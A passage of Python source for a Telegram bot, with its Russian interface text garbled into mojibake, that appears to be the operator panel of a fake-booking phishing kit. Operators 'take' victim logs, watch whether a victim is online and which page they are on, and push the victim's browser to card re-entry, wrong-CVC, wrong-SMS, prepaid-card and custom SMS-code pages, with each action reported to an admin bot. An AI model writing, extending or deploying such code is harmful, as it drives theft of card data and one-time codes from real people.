                    "prepaid": "‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –≤–≤–æ–¥–∞ –∫–∞—Ä—Ç—ã –∑–∞–Ω–æ–≤–æ (Prepaid card)"
                }
                
                # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ —Å –∫–Ω–æ–ø–∫–∞–º–∏ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è
                await callback.message.answer(
                    messages[action]
                )
                
                # –£–≤–µ–¥–æ–º–ª—è–µ–º –∞–¥–º–∏–Ω—Å–∫–∏–π –±–æ—Ç –æ –æ—Ç–≤–µ—Ç–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
                await notify_user_response(booking_id, client_id, username, callback.from_user.id, messages[action])
                
            else:
                error_msg = "‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è"
                await callback.message.answer(error_msg)
                await notify_user_response(booking_id, client_id, username, callback.from_user.id, error_msg)
                
    except Exception as e:
        print(f"Error redirecting user: {e}")
        error_msg = "‚ùå –û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å —Å–µ—Ä–≤–µ—Ä–æ–º"
        await callback.message.answer(error_msg)
        await notify_user_response(booking_id, client_id, username, callback.from_user.id, error_msg)

async def check_online_status(callback: types.CallbackQuery):
    session_id = callback.data.split(":")[1]
    
    log = get_log_by_session(session_id)
    if not log or log['taken_by'] != callback.from_user.id:
        await callback.answer("–£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –ª–æ–≥—É", show_alert=True)
        return
    
    try:
        async with httpx.AsyncClient() as client:
            response = await client.get(f"{config.SERVER_URL}/check-online-status/{session_id}")
            
            if response.status_code == 200:
                data = response.json()
                booking_id = log['booking_id']
                client_id = log['client_id']
                
                if data.get("online"):
                    current_page = data.get("currentPageDisplay", "Unknown")
                    message = (
                        f"üÜî #{booking_id} || #{client_id}\n\n"
                        f"üü¢ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –û–ù–õ–ê–ô–ù\n\n"
                        f"üìç –¢–µ–∫—É—â–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞: {current_page}\n"
                        f"‚è∞ –ü–æ—Å–ª–µ–¥–Ω—è—è –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å: —Ç–æ–ª—å–∫–æ —á—Ç–æ"
                    )
                else:
                    last_known_page = data.get("lastKnownPageDisplay", "–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ")
                    last_seen = data.get("lastSeen", "–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ")
                    message = (
                        f"üÜî #{booking_id} || #{client_id}\n\n"
                        f"üî¥ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –û–§–§–õ–ê–ô–ù\n\n"
                        f"üìÑ –ü–æ—Å–ª–µ–¥–Ω—è—è –∏–∑–≤–µ—Å—Ç–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞: {last_known_page}\n"
                        f"‚è∞ –ü–æ—Å–ª–µ–¥–Ω—è—è –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å: {last_seen}"
                    )
                await callback.message.answer(message)
                
                # –£–≤–µ–¥–æ–º–ª—è–µ–º –∞–¥–º–∏–Ω—Å–∫–∏–π –±–æ—Ç –æ –ø—Ä–æ–≤–µ—Ä–∫–µ —Å—Ç–∞—Ç—É—Å–∞
                username = callback.from_user.username or "–±–µ–∑ username"
                await notify_action(booking_id, client_id, username, callback.from_user.id, "check_online", "üîç –ü—Ä–æ–≤–µ—Ä–∫–∞ –æ–Ω–ª–∞–π–Ω —Å—Ç–∞—Ç—É—Å–∞")
                await notify_user_response(booking_id, client_id, username, callback.from_user.id, message)
            else:
                error_msg = "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å —Å—Ç–∞—Ç—É—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"
                await callback.message.answer(error_msg)
                username = callback.from_user.username or "–±–µ–∑ username"
                await notify_user_response(booking_id, client_id, username, callback.from_user.id, error_msg)
                
    except Exception as e:
        print(f"Error checking online status: {e}")
        error_msg = "‚ùå –û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å —Å–µ—Ä–≤–µ—Ä–æ–º"
        await callback.message.answer(error_msg)
        username = callback.from_user.username or "–±–µ–∑ username"
        await notify_user_response(booking_id, client_id, username, callback.from_user.id, error_msg)
    
    await callback.answer()

def register_callbacks(dp: Dispatcher):
    dp.callback_query.register(handle_take_log_with_timers, F.data.startswith("take:"))
    dp.callback_query.register(take_from_user, F.data.startswith("take_from_user:"))
    dp.callback_query.register(check_online_status, F.data.startswith("check_online:"))
    dp.callback_query.register(handle_redirect_action, F.data.startswith("balance:"))
    dp.callback_query.register(handle_redirect_action, F.data.startswith("sms:"))
    dp.callback_query.register(handle_redirect_action, F.data.startswith("change:"))
    dp.callback_query.register(handle_redirect_action, F.data.startswith("success:"))
    dp.callback_query.register(handle_redirect_action, F.data.startswith("wrong_cvc:")) 
    dp.callback_query.register(handle_redirect_action, F.data.startswith("wrong_sms:"))
    dp.callback_query.register(handle_redirect_action, F.data.startswith("prepaid:"))
    dp.callback_query.register(handle_custom_sms, F.data.startswith("custom_sms:"))
    dp.message.register(handle_sms_code_input, CustomSMSStates.waiting_for_sms_code)
# [file content end]